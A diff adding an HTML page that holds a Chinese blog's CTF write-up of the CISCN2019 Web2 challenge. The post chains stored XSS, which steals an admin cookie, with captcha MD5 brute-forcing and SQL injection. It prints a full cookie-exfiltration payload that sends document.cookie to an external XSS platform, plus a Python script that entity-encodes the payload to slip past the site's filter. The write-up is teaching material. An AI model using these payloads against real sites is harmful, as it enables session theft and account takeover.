@@ -1,0 +1,323 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>小张的博客</title>
+<meta name="description" content="我是小张，一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。" />
+<link rel="shortcut icon" href="https://zhangzy999.github.io//favicon.ico?v=1588083508482">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://zhangzy999.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://zhangzy999.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://zhangzy999.github.io//images/avatar.png?v=1588083508482" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">小张的博客</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          所有内容
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">HELLO WORLD.</div>
+    <a class="rss" href="https://zhangzy999.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">CTF之一道硬核的XSS梦幻联动SQL注入的赛题—[CISCN2019 华东北赛区]Web2</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-04-28 / 6 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/web2-xss.jpg" alt="">
+        
+        <div class="post-content yue">
+          <p>文章撰写参考链接，原大佬博客<a href="%22https://www.zhaoj.in/read-6100.html%22"></a><br>
+本文是笔者在学习大佬博客基础上写成的(我太菜了)<br>
+这道题呢对小白一点儿也不友好<br>
+反正我是打了五个小时，最后发现payload没有加引号（骂骂咧咧）<br>
+言归正传，我们打开环境，发现是一个网站，有投稿和反馈功能<br>
+<img src="https://zhangzy999.github.io//post-images/1588078652213.png" alt="" loading="lazy"><br>
+就是说我们可以投稿，然后点击审核，管理员就会来到我们的页面，审核我们的投稿<br>
+这样的话我们可以构造恶意代码，让管理员进去，从而窃取管理员的cookie，进入后台为所欲为（滑稽）<br>
+好，我们看一下它的投稿页面和审核页面<br>
+<img src="https://zhangzy999.github.io//post-images/1588078732024.png" alt="" loading="lazy"><br>
+<img src="https://zhangzy999.github.io//post-images/1588078738665.png" alt="" loading="lazy"><br>
+嗯，xss没跑了<br>
+我们上平台，平台链接是<br>
+<a href="http://xss.buuoj.cn/">buu的xss平台</a><br>
+你需要注册一个账号，然后新建项目，这块不说了，就跟安装软件一直点下一步一样简单。。。<br>
+<img src="https://zhangzy999.github.io//post-images/1588079093914.png" alt="" loading="lazy"><br>
+OK，平台会自动帮我们生成xss代码，自己可以研究一下那一摞代码都是干嘛的，很有意思哟<br>
+OK，我们回到投稿页面，来一个最简单的脚本实验一下</p>
+<pre><code class="language-Javascript">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>提示我们上传成功<br>
+<img src="https://zhangzy999.github.io//post-images/1588079347722.png" alt="" loading="lazy"><br>
+我们点击那个页面，但是并没有弹窗，我们查看页面源代码，好像发现了不得了的事情<br>
+<img src="https://zhangzy999.github.io//post-images/1588079455672.png" alt="" loading="lazy"><br>
+没错，我们输入的英文小括号被换成中文的了，说明后端有保护机制，不过虽然头大，我们却可以用markup编码的方式绕过（就是我们喜闻乐见的&amp;#编码）<br>
+<img src="https://zhangzy999.github.io//post-images/1588080034916.png" alt="" loading="lazy"><br>
+这个编码就是&amp;#后面加上我们的ascii码<br>
+链接如下：<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html"></a><br>
+再看之前的源代码<br>
+<img src="https://zhangzy999.github.io//post-images/1588080193440.png" alt="" loading="lazy"><br>
+它有个CSP内容安全策略的存在，<a href="https://blog.csdn.net/u014465934/article/details/84199171">CSP内容安全策略详解，在此不再赘述</a><br>
+对，它开启了'unsafe-eval'，所以我们可以用eval来执行我们的代码<br>
+好，我们的payload为</p>
+<pre><code class="language-javascript">&lt;svg&gt;&lt;script&gt;eval(&quot;xss&quot;)&lt;/script&gt;
+</code></pre>
+<p>而xss就是我们要填充的恶意代码，如下</p>
+<pre><code class="language-javascript">(function(){window.location.href=
+'http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
++
+escape((function(){try{return document.location.href}catch(e){return''}})())
++
+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
++
+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
++
+'&amp;opener='
++
+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)
+?window.opener.location.href:''}catch(e){return''}})());})();
+</code></pre>
+<p>注意哈，我是为了大家阅读代码才用换行符分开的，大家中间不要掺杂换行符否则xss不会成功的<br>
+<img src="https://zhangzy999.github.io//post-images/1588080785595.png" alt="" loading="lazy"><br>
+还有一点，就是上图的id那里要设置成你的项目的id，在项目代码里有<br>
+然后接下来我们要做的就是把上述内容给它来个Markup编码，但是手工emm几乎不可能实现除非你是肝帝<br>
+接下来上python脚本好了（版本python2.7）</p>
+<pre><code class="language-python">payload_end = ''
+payload = &quot;(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
++escape((function(){try{return document.location.href}catch(e){return''}})())+
+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
++'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
++'&amp;opener='+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''}
+catch(e){return''}})());})();&quot;
+for i in payload:
+    payload_end += &quot;&amp;#&quot; + str(ord(i))
+payload_final = &quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + payload_end + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;
+print payload_final
+</code></pre>
+<p>同样是便于阅读，再此强调一下哈，中间千万别要换行符，因为换行符会占一个ascii码的......<br>
+脚本运行效果如下：<br>
+<img src="https://zhangzy999.github.io//post-images/1588081474858.png" alt="" loading="lazy"><br>
+再次提醒：前文中我省事儿用的是别的大佬的payload，这个做法可以，但是不要忘记改id哦~<br>
+当然......你在你的项目里复制代码最好不过了<br>
+然后我们提交这段恶意代码，显示提交成功，这个时候我们的任务已经完成一半了，接下来要做的是反馈页面，然后让管理员访问我们的提交页面从而偷取它的cookie     <s>馋了，想吃曲奇饼干了</s><br>
+好，我们进入反馈页面<br>
+<img src="https://zhangzy999.github.io//post-images/1588081872289.png" alt="" loading="lazy"><br>
+它还需要验证码，给大家附上一个链接，讲的是hash碰撞与生日攻击，蛮有意思的，虽然我没看完（逃）<br>
+<a href="https://blog.csdn.net/zl1zl2zl3/article/details/83476069">哈希碰撞与生日攻击学习参考链接</a><br>
+好，由于是前六位，我们需要的工作量并不是特别大，最起码我们知道了循环的范围是从6位数开始，额，先到1k我循环试试吧，不过经过我的多次实验发现1kw足够了，下面是碰撞md5的python脚本（python大法好）</p>
+<pre><code class="language-python">import hashlib
+for x in range(100000,10000000):
+    md5_hack = hashlib.md5(str(x)).hexdigest()
+    if md5_hack[0:6] == &quot;1d5327&quot; :
+        print x
+</code></pre>
+<p>上述代码中的&quot;1d5327&quot;就是我们反馈的时候提示我们的验证码，我们通过碰撞的方式来得到原来的验证码<br>
+经过十几秒最终跑出来了<br>
+<img src="https://zhangzy999.github.io//post-images/1588082715077.png" alt="" loading="lazy"><br>
+我们输入碰撞得来的密码，提示我们反馈成功<br>
+<img src="https://zhangzy999.github.io//post-images/1588082798662.png" alt="" loading="lazy"><br>
+OK，我们去平台那里坐等管理员的cookie<br>
+<img src="https://zhangzy999.github.io//post-images/1588082880953.png" alt="" loading="lazy"><br>
+OK，拿到cookie了，然后开始扫描康康管理员的后台登录界面<br>
+很简单，就是admin.php<br>
+我们进去之后<br>
+发现如下图：<br>
+<img src="https://zhangzy999.github.io//post-images/1588082964511.png" alt="" loading="lazy"><br>
+提示我们不是管理员，没毛病吧，然后我们通过小插件来输入管理员的cookie，伪造管理员的身份进去就好啦<br>
+<img src="https://zhangzy999.github.io//post-images/1588083070484.png" alt="" loading="lazy"><br>
+好，我们已经成功进入后台，出现了一个查询框框<br>
+<img src="https://zhangzy999.github.io//post-images/1588083098026.png" alt="" loading="lazy"><br>
+嗯......sql注入没跑了<br>
+这个sql注入是最低级的sql注入了，没有防火墙，sqlmap一把梭即可，或者手工注入也很简单鸭<br>
+我直接附上注入的最后结果<br>
+<img src="https://zhangzy999.github.io//post-images/1588083277788.png" alt="" loading="lazy"><br>
+如果大家对sql注入的赛题感兴趣，请在哔哩哔哩上搜索up主：yuyu-宇<br>
+这个是我的主页，我做了很多包括教学视频和刷题视频，都是sql注入方面的<br>
+如果文章内容哪里不对，还请哔哩哔哩私信联系我，蟹蟹大家！！</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/4WWBpkiIM/">
+            <span class="flex-auto">学习总结与收获</span>
+          </a>
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/toXtjW_Oa/">
+            <span class="flex-auto">CTF</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/zhuzhuxia/">
+                <h3 class="post-title">
+                  日记或者杂七杂八的东东—高数课的&#34;猪猪侠&#34;
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://zhangzy999.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
